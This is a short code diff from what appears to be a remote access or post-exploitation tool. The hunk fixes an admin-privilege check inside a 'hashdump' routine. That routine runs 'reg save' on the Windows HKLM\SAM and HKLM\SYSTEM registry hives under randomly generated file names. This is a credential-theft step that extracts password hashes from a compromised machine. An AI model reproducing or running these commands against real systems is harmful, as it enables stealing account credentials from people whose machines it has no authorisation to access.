@@ -463,7 +463,7 @@ class Information_Gathering:
 		sam_name = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
 		system_name = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
 		try:
-			if not isadmin: return "[-]You need to have admin privileges to run hashdump."
+			if not isadmin(): return "[-]You need to have admin privileges to run hashdump."
 
 			execute.execute_shell_command("reg save HKLM\\SAM "+sam_name)
 			execute.execute_shell_command("reg save HKLM\\SYSTEM "+system_name)
